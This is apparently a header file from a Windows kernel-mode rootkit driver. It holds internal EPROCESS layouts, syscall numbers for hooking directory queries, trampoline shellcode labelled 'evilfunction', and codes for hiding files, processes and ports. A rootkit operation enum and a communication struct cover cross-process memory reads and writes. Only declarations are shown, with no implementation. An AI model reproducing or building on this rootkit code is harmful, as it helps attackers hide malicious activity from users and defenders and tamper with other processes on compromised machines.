#pragma once
#pragma warning(disable : 4201)
#include <ntifs.h>
#include <wdm.h>
#include <ntddk.h>
#include <ntimage.h>
#include <minwindef.h>
#include "problematic.h"
#define NTQUERY_TAG 'HkQr'
#define NTQUERYEX_TAG 'HkQx'
#define NTQUERYEX_SYSCALL22H2 0x014b
#define NTQUERYEX_SYSCALL1809 0x013b 
#define NTQUERY_SYSCALL22H2 0x0035
#define NTQUERY_SYSCALL1809 0x0035
#define REGULAR_BUFFER 0xDEAFBEED  // Represents a normal buffer


// Default shellcode for hooks:
CONST BYTE DEFAULT_SHELLCODE[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
									0x41, 0xff, 0xe5 };  // jmp r13 (jmp evilfunction)


// Definitions of file hiding values:
#define SHOW_HIDDEN 0x7777FFFFFFFFFFFF  // Remove a file from HookHide
#define HIDE_FILE 0xFFFFFFFFFFFFFFFF  // Hide a file in HookHide
#define UNHIDE_TEMPSUC STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY  // Temporary success for un-hiding file/folder
#define HIDE_TEMPSUC STATUS_WX86_CREATEWX86TIB  // Temporary success for hiding file/folder
#define SHOWHIDDEN_TEMPSUC STATUS_VOLSNAP_HIBERNATE_READY  // Temporary success for showing list
#define UNHIDE_PROCESS STATUS_INVALID_NETWORK_RESPONSE  // Code used by client/medium for unhiding process
#define HIDE_PROCESS STATUS_VIRTUAL_CIRCUIT_CLOSED  // Code used by client/medium for hiding process
#define SHOWHIDDEN_PROCESS STATUS_INTERNAL_DB_CORRUPTION  // Code used by client/medium for listing hidden processes
#define REMOVE_BY_INDEX_PID 0xFCFCFCCFCFCFDB  // Value of PID when asking to remove by index and not by PID
#define UnhideProcess 0xC0C0C0C00C0C0C0C
#define HideProcess 0xCDCDCDCDDCDCDCDC
#define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0


typedef struct _KAFFINITY_EX {
	char Affinity[0xA8];
} KAFFINITY_EX, * PKAFFINITY_EX;

typedef struct _KSTACK_COUNT {
	char Affinity[4];
} KSTACK_COUNT, * PKSTACK_COUNT;

typedef struct _MMSUPPORT_FULL {
	char Vm[0x110];
} MMSUPPORT_FULL, * PMMSUPPORT_FULL;

typedef struct _ALPC_PROCESS_CONTEXT {
	char AlpcContext[0x20];
} ALPC_PROCESS_CONTEXT, * PALPC_PROCESS_CONTEXT;

typedef struct _PS_PROCESS_WAKE_INFORMATION {
	char WakeInfo[0x30];
} PS_PROCESS_WAKE_INFORMATION, * PPS_PROCESS_WAKE_INFORMATION;

typedef struct _PS_PROTECTION
{
	union
	{
		UCHAR Level;                                                        //0x0
		struct
		{
			UCHAR Type : 3;                                                   //0x0
			UCHAR Audit : 1;                                                  //0x0
			UCHAR Signer : 4;                                                 //0x0
		};
	};
} PS_PROTECTION, * PPS_PROTECTION;


// Internal EPROCESS/KPROCESS of 1809:
typedef struct _ACTKPROCESS {
	DISPATCHER_HEADER Header;
	LIST_ENTRY ProfileListHead;
	UINT64 DirectoryTableBase;
	LIST_ENTRY ThreadListHead;
	UINT ProcessLock;
	UINT ProcessTimerDelay;
	UINT64 DeepFreezeStartTime;
	KAFFINITY_EX Affinity;
	LIST_ENTRY ReadyListHead;
	SINGLE_LIST_ENTRY SwapListEntry;
	KAFFINITY_EX ActiveProcessors;
	/*
   AutoAlignment    : Pos 0; 1 Bit
   DisableBoost     : Pos 1; 1 Bit
   DisableQuantum   : Pos 2; 1 Bit
   DeepFreeze       : Pos 3; 1 Bit
   TimerVirtualization : Pos 4; 1 Bit
   CheckStackExtents : Pos 5; 1 Bit
   CacheIsolationEnabled : Pos 6; 1 Bit
   PpmPolicy        : Pos 7; 3 Bits
   ActiveGroupsMask : Pos 10; 20 Bits
   VaSpaceDeleted   : Pos 30; 1 Bit
   ReservedFlags    : Pos 31; 1 Bit
	*/
	int ProcessFlags;
	char BasePriority;
	char QuantumReset;
	char Visited;
	char Flags;
	UINT ThreadSeed[20];
	USHORT IdealNode[20];
	USHORT IdealGlobalNode;
	USHORT Spare1;
	KSTACK_COUNT StackCount;
	LIST_ENTRY ProcessListEntry;
	UINT64 CycleTime;
	UINT64 ContextSwitches;
	PVOID SchedulingGroup;
	UINT FreezeCount;
	UINT KernelTime;
	UINT UserTime;
	UINT ReadyTime;
	UINT64 UserDirectoryTableBase;
	UCHAR AddressPolicy;
	UCHAR Spare[71];
	PVOID InstrumentationCallback;
	PVOID SecureState;
} ACTKPROCESS, * PACTKPROCESS;

typedef struct _ACTEPROCESS {
	ACTKPROCESS Pcb;
	ULONG_PTR ProcessLock;
	PVOID UniqueProcessId;
	LIST_ENTRY ActiveProcessLinks;
	EX_RUNDOWN_REF RundownProtect;
	UINT Flags2;
	/*
		+ 0x300 JobNotReallyActive : Pos 0, 1 Bit
		+ 0x300 AccountingFolded : Pos 1, 1 Bit
		+ 0x300 NewProcessReported : Pos 2, 1 Bit
		+ 0x300 ExitProcessReported : Pos 3, 1 Bit
		+ 0x300 ReportCommitChanges : Pos 4, 1 Bit
		+ 0x300 LastReportMemory : Pos 5, 1 Bit
		+ 0x300 ForceWakeCharge : Pos 6, 1 Bit
		+ 0x300 CrossSessionCreate : Pos 7, 1 Bit
		+ 0x300 NeedsHandleRundown : Pos 8, 1 Bit
		+ 0x300 RefTraceEnabled : Pos 9, 1 Bit
		+ 0x300 PicoCreated : Pos 10, 1 Bit
		+ 0x300 EmptyJobEvaluated : Pos 11, 1 Bit
		+ 0x300 DefaultPagePriority : Pos 12, 3 Bits
		+ 0x300 PrimaryTokenFrozen : Pos 15, 1 Bit
		+ 0x300 ProcessVerifierTarget : Pos 16, 1 Bit
		+ 0x300 RestrictSetThreadContext : Pos 17, 1 Bit
		+ 0x300 AffinityPermanent : Pos 18, 1 Bit
		+ 0x300 AffinityUpdateEnable : Pos 19, 1 Bit
		+ 0x300 PropagateNode : Pos 20, 1 Bit
		+ 0x300 ExplicitAffinity : Pos 21, 1 Bit
		+ 0x300 ProcessExecutionState : Pos 22, 2 Bits
		+ 0x300 EnableReadVmLogging : Pos 24, 1 Bit
		+ 0x300 EnableWriteVmLogging : Pos 25, 1 Bit
		+ 0x300 FatalAccessTerminationRequested : Pos 26, 1 Bit
		+ 0x300 DisableSystemAllowedCpuSet : Pos 27, 1 Bit
		+ 0x300 ProcessStateChangeRequest : Pos 28, 2 Bits
		+ 0x300 ProcessStateChangeInProgress : Pos 30, 1 Bit
		+ 0x300 InPrivate : Pos 31, 1 Bit
		*/
	UINT Flags;
	/*
+ 0x304 CreateReported : Pos 0, 1 Bit
+ 0x304 NoDebugInherit : Pos 1, 1 Bit
+ 0x304 ProcessExiting : Pos 2, 1 Bit
+ 0x304 ProcessDelete : Pos 3, 1 Bit
+ 0x304 ManageExecutableMemoryWrites : Pos 4, 1 Bit
+ 0x304 VmDeleted : Pos 5, 1 Bit
+ 0x304 OutswapEnabled : Pos 6, 1 Bit
+ 0x304 Outswapped : Pos 7, 1 Bit
+ 0x304 FailFastOnCommitFail : Pos 8, 1 Bit
+ 0x304 Wow64VaSpace4Gb : Pos 9, 1 Bit
+ 0x304 AddressSpaceInitialized : Pos 10, 2 Bits
+ 0x304 SetTimerResolution : Pos 12, 1 Bit
+ 0x304 BreakOnTermination : Pos 13, 1 Bit
+ 0x304 DeprioritizeViews : Pos 14, 1 Bit
+ 0x304 WriteWatch : Pos 15, 1 Bit
+ 0x304 ProcessInSession : Pos 16, 1 Bit
+ 0x304 OverrideAddressSpace : Pos 17, 1 Bit
+ 0x304 HasAddressSpace : Pos 18, 1 Bit
+ 0x304 LaunchPrefetched : Pos 19, 1 Bit
+ 0x304 Background : Pos 20, 1 Bit
+ 0x304 VmTopDown : Pos 21, 1 Bit
+ 0x304 ImageNotifyDone : Pos 22, 1 Bit
+ 0x304 PdeUpdateNeeded : Pos 23, 1 Bit
+ 0x304 VdmAllowed : Pos 24, 1 Bit
+ 0x304 ProcessRundown : Pos 25, 1 Bit
+ 0x304 ProcessInserted : Pos 26, 1 Bit
+ 0x304 DefaultIoPriority : Pos 27, 3 Bits
+ 0x304 ProcessSelfDelete : Pos 30, 1 Bit
+ 0x304 SetTimerResolutionLink : Pos 31, 1 Bit
*/
	LARGE_INTEGER CreateTime;
	UINT64 ProcessQuotaUsage[2];
	UINT64 ProcessQuotaPeak[2];
	UINT64 PeakVirtualSize;
	UINT64 VirtualSize;
	LIST_ENTRY SessionProcessLinks;
	PVOID ExceptionPortData;  // also defined as UINT64 ExceptionPortValue;
	/*
+ 0x350 ExceptionPortState : Pos 0, 3 Bits
*/
	ULONG64 Token;
	UINT64 MmReserved;
	ULONG_PTR AddressCreationLock;
	ULONG_PTR PageTableCommitmentLock;
	PVOID RotateInProgress;
	PVOID ForkInProgress;
	PVOID CommitChargeJob;
	ULONG64 CloneRoot;
	UINT64 NumberOfPrivatePages;
	UINT64 NumberOfLockedPages;
	PVOID Win32Process;
	PVOID Job;
	PVOID SectionObject;
	PVOID SectionBaseAddress;
	UINT64 Cookie;
	PVOID WorkingSetWatch;
	PVOID Win32WindowStation;
	PVOID InheritedFromUniqueProcessId;
	PVOID Spare0;
	UINT64 OwnerProcessId;
	PVOID Peb;
	PVOID Session;
	PVOID Spare1;
	PVOID QuotaBlock;
	PVOID ObjectTable;
	PVOID DebugPort;
	PVOID WoW64Process;
	PVOID DeviceMap;
	PVOID EtwDataSource;
	UINT64 PageDirectoryPte;
	PVOID ImageFilePointer;
	UCHAR ImageFileName[15];
	UCHAR PriorityClass;
	PVOID SecurityPort;
	ULONG64 SeAuditProcessCreationInfo;
	LIST_ENTRY JobLinks;
	PVOID HighestUserAddress;
	LIST_ENTRY ThreadListHead;
	UINT ActiveThreads;
	UINT ImagePathHash;
	UINT DefaultHardErrorProcessing;
	int LastThreadExitStatus;
	ULONG64 PrefetchTrace;
	PVOID LockedPagesList;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	UINT64 CommitChargeLimit;
	UINT64 CommitCharge;
	UINT64 CommitChargePeak;
	MMSUPPORT_FULL Vm;
	LIST_ENTRY MmProcessLinks;
	UINT ModifiedPageCount;
	int ExitStatus;
	ULONG64 VadRoot;
	PVOID VadHint;
	UINT64 VadCount;
	UINT64 VadPhysicalPages;
	UINT64 VadPhysicalPagesLimit;
	ALPC_PROCESS_CONTEXT AlpcContext;
	LIST_ENTRY TimerResolutionLink;
	PVOID TimerResolutionStackRecord;
	UINT RequestedTimerResolution;
	UINT SmallestTimerResolution;
	LARGE_INTEGER ExitTime;
	PVOID InvertedFunctionTable;
	ULONG_PTR InvertedFunctionTableLock;
	UINT ActiveThreadsHighWatermark;
	UINT LargePrivateVadCount;
	ULONG_PTR ThreadListLock;
	PVOID WnfContext;
	PVOID ServerSilo;
	UCHAR SignatureLevel;
	UCHAR SectionSignatureLevel;
	PS_PROTECTION Protection;
	UINT Flags3;
	/*
+ 0x6cc Minimal : Pos 0, 1 Bit
		+ 0x6cc ReplacingPageRoot : Pos 1, 1 Bit
		+ 0x6cc Crashed : Pos 2, 1 Bit
		+ 0x6cc JobVadsAreTracked : Pos 3, 1 Bit
		+ 0x6cc VadTrackingDisabled : Pos 4, 1 Bit
		+ 0x6cc AuxiliaryProcess : Pos 5, 1 Bit
		+ 0x6cc SubsystemProcess : Pos 6, 1 Bit
		+ 0x6cc IndirectCpuSets : Pos 7, 1 Bit
		+ 0x6cc RelinquishedCommit : Pos 8, 1 Bit
		+ 0x6cc HighGraphicsPriority : Pos 9, 1 Bit
		+ 0x6cc CommitFailLogged : Pos 10, 1 Bit
		+ 0x6cc ReserveFailLogged : Pos 11, 1 Bit
		+ 0x6cc SystemProcess : Pos 12, 1 Bit
		+ 0x6cc HideImageBaseAddresses : Pos 13, 1 Bit
		+ 0x6cc AddressPolicyFrozen : Pos 14, 1 Bit
		+ 0x6cc ProcessFirstResume : Pos 15, 1 Bit
		+ 0x6cc ForegroundExternal : Pos 16, 1 Bit
		+ 0x6cc ForegroundSystem : Pos 17, 1 Bit
		+ 0x6cc HighMemoryPriority : Pos 18, 1 Bit
		+ 0x6cc EnableProcessSuspendResumeLogging : Pos 19, 1 Bit
		+ 0x6cc EnableThreadSuspendResumeLogging : Pos 20, 1 Bit
		+ 0x6cc SecurityDomainChanged : Pos 21, 1 Bit
		+ 0x6cc SecurityFreezeComplete : Pos 22, 1 Bit
		+ 0x6cc VmProcessorHost : Pos 23, 1 Bit
		*/
	INT64 DeviceAsid;
	PVOID SvmData;
	ULONG_PTR SvmProcessLock;
	UINT64 SvmLock;
	LIST_ENTRY SvmProcessDeviceListHead;
	UINT64 LastFreezeInterruptTime;
	PVOID DiskCounters;
	PVOID PicoContext;
	PVOID EnclaveTable;
	UINT64 EnclaveNumber;
	ULONG_PTR EnclaveLock;
	UINT64 HighPriorityFaultsAllowed;
	PVOID EnergyContext;
	PVOID VmContext;
	UINT64 SequenceNumber;
	UINT64 CreateInterruptTime;
	UINT64 CreateUnbiasedInterruptTime;
	UINT64 TotalUnbiasedFrozenTime;
	UINT64 LastAppStateUpdateTime;
	ULONG64 LastAppState;
	/*
		+ 0x770 LastAppStateUptime : Pos 0, 61 Bits
		+ 0x770 LastAppState : Pos 61, 3 Bits
		*/
	UINT64 SharedCommitCharge;
	ULONG_PTR SharedCommitLock;
	LIST_ENTRY SharedCommitLinks;
	UINT64 AllowedCpuSets;  // Can also be AllowedCpuSetsIndirect (PVOID)
	UINT64 DefaultCpuSets;  // Can also be DefaultCpuSetsIndirect (PVOID)
	PVOID DiskIoAttribution;
	PVOID DxgProcess;
	UINT64 Win32KFilterSet;
	ULONG64 ProcessTimerDelay;
	UINT KTimerSets;
	UINT KTimer2Sets;
	UINT64 ThreadTimerSets;
	UINT64 VirtualTimerListLock;
	LIST_ENTRY VirtualTimerListHead;
	PS_PROCESS_WAKE_INFORMATION WakeInfo;  // Can also be WakeChannel (WNF_STATE_NAME)
	UINT MitigationFlags;
	UINT MitigationFlags2;
	PVOID PartitionObject;
	UINT64 SecurityDomain;
	UINT64 ParentSecurityDomain;
	PVOID CoverageSamplerContext;
	PVOID MmHotPatchContext;
} ACTEPROCESS, * PACTEPROCESS;

typedef struct _SHORTENEDACTEPROCESS {
	PVOID UniqueProcessId;
	UINT Flags;
	LARGE_INTEGER CreateTime;
	UINT64 PeakVirtualSize;
	UINT64 VirtualSize;
	UINT64 Cookie;
	UINT64 OwnerProcessId;
	UINT64 PageDirectoryPte;
	UCHAR ImageFileName[15];
	UCHAR PriorityClass;
	PVOID HighestUserAddress;
	UINT ActiveThreads;
	int LastThreadExitStatus;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	int ExitStatus;
} SHORTENEDACTEPROCESS, * PSHORTENEDACTEPROCESS;


/*
=====================
REQUIRED DEFINITIONS:
=====================
*/


// ZwQuerySystemInformation return structures -
typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, * PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved2;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID Reserved3;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG Reserved4;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	PVOID Reserved5;
	SIZE_T QuotaPagedPoolUsage;
	PVOID Reserved6;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER Reserved1[3];
	ULONG Reserved2;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG Reserved3;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
	ULONG RegistryQuotaAllowed;
	ULONG RegistryQuotaUsed;
	PVOID Reserved1;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, * PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
	BYTE Reserved1[24];
	PVOID Reserved2[4];
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
	BYTE Reserved1[48];
} SYSTEM_TIMEOFDAY_INFORMATION, * PSYSTEM_TIMEOFDAY_INFORMATION;

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
	BYTE Reserved1[312];
} SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION {
	BYTE Reserved1[16];
} SYSTEM_EXCEPTION_INFORMATION, * PSYSTEM_EXCEPTION_INFORMATION;

typedef struct _SYSTEM_LOOKASIDE_INFORMATION {
	BYTE Reserved1[32];
} SYSTEM_LOOKASIDE_INFORMATION, * PSYSTEM_LOOKASIDE_INFORMATION;

typedef struct _SYSTEM_INTERRUPT_INFORMATION {
	BYTE Reserved1[24];
} SYSTEM_INTERRUPT_INFORMATION, * PSYSTEM_INTERRUPT_INFORMATION;

typedef struct _SYSTEM_POLICY_INFORMATION {
	PVOID Reserved1[2];
	ULONG Reserved2[3];
} SYSTEM_POLICY_INFORMATION, * PSYSTEM_POLICY_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
	ULONG   Length;
	ULONG   CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, * PSYSTEM_CODEINTEGRITY_INFORMATION;

typedef struct _SYSTEM_MODULE
{
	PVOID Reserved[2];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT Unknown;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	CHAR ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG ModulesCount;
	SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;


// data about a specific module from a process (i.e an DLL imported in the process) -
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

// data about all DLLs (loaded modules) of a specific process, returned in ZwQuerySystemInformation with SystemModuleInformation -
typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;


// SYSTEM_INFORMATION_CLASS definitions for ZwQuerySystemInformation -
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45,
	SystemCodeIntegrityInformation = 103,
	SystemPolicyInformation = 134,
	SystemModuleInformation = 0x0B,
} SYSTEM_INFORMATION_CLASS;



/*
============================
DEPENDENCIES OF MAIN STRUCT:
============================
*/


typedef enum _ROOTKIT_STATUS {
	ROOTKSTATUS_SUCCESS = 0xFF000000,
	ROOTKSTATUS_SYSTEMSPC = 0xFF000001,
	ROOTKSTATUS_PRCPEB = 0xFF000002,
	ROOTKSTATUS_PRCLOADMDLS = 0xFF000003,
	ROOTKSTATUS_OTHER = 0xFF000004,
	ROOTKSTATUS_ADRBUFSIZE = 0xFF000005,
	ROOTKSTATUS_QUERYVIRTMEM = 0xFF000006,
	ROOTKSTATUS_INVARGS = 0xFF000007,
	ROOTKSTATUS_PROTECTIONSTG = 0xFF000008,
	ROOTKSTATUS_NOWRITEPRMS = 0xFF000009,
	ROOTKSTATUS_COPYFAIL = 0x0000000A,
	ROOTKSTATUS_LESSTHNREQ = 0xFF00000B,
	ROOTKSTATUS_MEMALLOC = 0xFF00000C,
	ROOTKSTATUS_NOTCOMMITTED = 0xFF00000D,
	ROOTKSTATUS_QUERYSYSINFO = 0xFF00000E,
	ROOTKSTATUS_PROCHANDLE = 0xFF00000F,
	ROOTKSTATUS_ACSVIO = 0xFF000010,
	ROOTKSTATUS_NOTSUPPORTED = 0xFF000011,
	ROOTKSTATUS_NOTINRELRANGE = 0xFF000012,
	ROOTKSTATUS_PROCESSEPRC = 0XFF000013,
	ROOTKSTATUS_USERSPACE = 0XFF000014,
}ROOTKIT_STATUS, * PROOTKIT_STATUS;


typedef enum _ROOTKIT_OPERATION {
	RKOP_WRITE = 0xB000006F,
	RKOP_READ = 0xB000007F,
	RKOP_MDLBASE = 0xB000008F,
	RKOP_SYSINFO = 0xB000009F,
	RKOP_PRCMALLOC = 0xB00000AF,
	RKOP_HIDEFILE = 0xB00000BF,
	RKOP_HIDEPROC = 0xB00000CF,
	RKOP_HIDEPORT = 0xB00000DF,

	RKOP_NOOPERATION = 0xB00000EF,
	RKOP_TERMINATE = 0xB00000FF,
}ROOTKIT_OPERATION, * PROOTKIT_OPERATION;


typedef enum _ROOTKIT_UNEXERR {
	successful = 0x7F7F0000,
	memalloc = 0x7F7F0001,
	relevantpid = 0x7F7F0002,
	receivedata = 0x7F7F0003,
	sendmessage = 0x7F7F0004,
	invalidargs = 0x7F7F0005,
}ROOTKIT_UNEXERR, * PROOTKIT_UNEXERR;


// Struct about passing data on system information -
typedef struct _RKSYSTEM_INFORMATION_CLASS {
	SYSTEM_INFORMATION_CLASS InfoType;
	ULONG InfoSize;
	ROOTKIT_STATUS ReturnStatus;
	PVOID PoolBuffer;
} RKSYSTEM_INFORMATION_CLASS, * PRKSYSTEM_INFORMATION_CLASS;


// Struct for passing string data -
typedef struct _STRING_DATA {
	const char* String;
	SIZE_T StrLen;
} STRING_DATA, * PSTRING_DATA;


/*
============
MAIN STRUCT:
============
*/


typedef struct _ROOTKIT_MEMORY {  // Used for communicating with the KM driver
	NTSTATUS Status;  // gets filled by the driver when the operation ends
	ROOTKIT_STATUS StatusCode;  // explains what the status means and why it is what it is
	ROOTKIT_OPERATION Operation;  // what operation to do (by defines)
	PVOID Buffer;  // buffer address (used for example in inputs)
	PVOID Out;  // pointer in memory to the output of the memory function
	ULONG64 Size; // size of memory chunk
	ULONG64 MainPID; // process that works on the memory
	ULONG64 SemiPID;  // (if the operation requests for reading) what is the PID of the destination process?
	ULONG64 MedPID;  // If needed, provide medium process PID
	const char* MdlName;  // (if the operation requests for a module base) what is the name of the module?
	const char* DstMdlName;  // (if the operation requests for a module base) what is the name of the module?
	ROOTKIT_UNEXERR Unexpected;  // data about an unexpected error that happened during the operation, is not relevant to driver
	BOOL IsFlexible;  // specifies if operations can be flexible
	PVOID Reserved;  // used for extra parameters needed to function
}ROOTKIT_MEMORY;

/*
======================================
STRUCTS FOR SPECIFIC USAGE (NOT ALOT):
======================================
*/


// Struct used for return of request system info (level one return type) -
typedef struct _RKSYSTEM_INFORET {
	ULONG64 BufferSize;
	PVOID Buffer;
} RKSYSTEM_INFORET;

/*
================================================
DEPENDENCIES OF IMPLEMENTATION / FUNCTION USAGE:
================================================
*/


typedef NTSTATUS(*QUERY_INFO_PROCESS) (
	__in HANDLE ProcessHandle,
	__in PROCESSINFOCLASS ProcessInformationClass,
	__out_bcount(ProcessInformationLength) PVOID ProcessInformation,
	__in ULONG ProcessInformationLength,
	__out_opt PULONG ReturnLength
	);


// data about an about-to-run/running usermode process (not used currently) -
typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE Reserved1[16];
	PVOID Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;


// the Process Environment Block loading data (data about used DLLs and other info for the loader, used in requests.cpp::GetModuleBase64bit and in _PEB struct) -
typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY ModuleListLoadOrder;
	LIST_ENTRY ModuleListMemoryOrder;
	LIST_ENTRY ModuleListInitOrder;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


// same as _PEB_LDR_DATA but for processes running on 32bit architecture (not used currently) -
typedef struct _PEB_LDR_DATA32
{
	ULONG Length;
	UCHAR Initialized;
	ULONG SsHandle;
	LIST_ENTRY32 InLoadOrderModuleList;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
} PEB_LDR_DATA32, * PPEB_LDR_DATA32;


typedef void(__stdcall* PPS_POST_PROCESS_INIT_ROUTINE)(void); // not exported, used in _PEB structure


// data about the Process Environment Block of a specific process (includes important data about a running process, used in requests.cpp::GetModuleBase64bit) -
typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID Reserved4[3];
	PVOID AtlThunkSListPtr;
	PVOID Reserved5;
	ULONG Reserved6;
	PVOID Reserved7;
	ULONG Reserved8;
	ULONG AtlThunkSListPtr32;
	PVOID Reserved9[45];
	BYTE Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	BYTE Reserved11[128];
	PVOID Reserved12[1];
	ULONG SessionId;
} PEB, * PPEB;


// same as _PEB but for 32bit architecture (not currently used) -
typedef struct _PEB32
{
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	UCHAR BitField;
	ULONG Mutant;
	ULONG ImageBaseAddress;
	ULONG Ldr;
	ULONG ProcessParameters;
	ULONG SubSystemData;
	ULONG ProcessHeap;
	ULONG FastPebLock;
	ULONG AtlThunkSListPtr;
	ULONG IFEOKey;
	ULONG CrossProcessFlags;
	ULONG UserSharedInfoPtr;
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	ULONG ApiSetMap;
} PEB32, * PPEB32;


// data about a specific module inside the loaded module (DLL) list of a specific process, appears as a part of a linked list somewhere in _PEB_LDR_DATA -
typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;  // in bytes
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;  // LDR_*
	USHORT LoadCount;
	USHORT TlsIndex;
	LIST_ENTRY HashLinks;
	PVOID SectionPointer;
	ULONG CheckSum;
	ULONG TimeDateStamp;
	//    PVOID			LoadedImports;
	//    // seems they are exist only on XP !!! PVOID
	//    EntryPointActivationContext;	// -same-
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


// Protect a chunk of virtual memory -
extern "C" __declspec(dllimport) NTSTATUS NTAPI ZwProtectVirtualMemory
(
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	PULONG ProtectSize,
	ULONG NewProtect,
	PULONG OldProtect
);


// Copy virtual memory from one process into another process (can also be used in KM with PeGetCurrentProcess as the PEPROCESS) -
extern "C" NTSTATUS NTAPI MmCopyVirtualMemory
(
	PEPROCESS SourceProcess,
	PVOID SourceAddress,
	PEPROCESS TargetProcess,
	PVOID TargetAddress,
	SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode,
	PSIZE_T ReturnSize
);


// Find a routine (function) from a module (dll, sys...) with the routine's name -
extern "C" NTKERNELAPI PVOID NTAPI RtlFindExportedRoutineByName(_In_ PVOID ImageBase, _In_ PCCH RoutineName);

// Get information about the system on a specific topic (InfoClass) -
extern "C" NTSTATUS ZwQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);

// Get the PEB of a process -
extern "C" NTKERNELAPI PPEB PsGetProcessPeb(IN PEPROCESS Process);